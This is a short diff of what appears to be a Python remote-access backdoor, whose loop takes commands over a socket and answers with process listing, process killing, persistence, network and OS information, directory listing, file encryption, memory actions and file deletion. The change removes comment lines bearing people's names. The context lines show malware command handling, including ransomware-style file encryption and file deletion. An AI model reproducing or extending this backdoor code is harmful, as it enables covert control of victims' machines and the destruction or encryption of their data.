@@ -200,8 +200,6 @@ while True:
     except IndexError:
         pass
 
-
-    # Lai Zhen
     if cmd == 'getproc':
         s.send(get_processes().encode())
     elif cmd == 'killproc':
@@ -213,7 +211,7 @@ while True:
     elif cmd == 'persistence':
         s.send(persistence().encode())
 
-    # Yong Yuan
+
     elif cmd == 'networkinf':
         s.send(network_inf().encode())
     if cmd == 'pwd':
@@ -225,13 +223,13 @@ while True:
     elif cmd == 'dir':
         s.send(dir().encode())
 
-    # Ghuan Ying
+
     elif cmd == 'getos':
         s.send(getos().encode())
     elif cmd == 'encrypt_files':
         s.send(encrypt_files().encode())
 
-    # Melveen
+
     elif cmd == 'ram':
         s.send(ram(arg).encode())
     elif cmd == 'file_deletion':
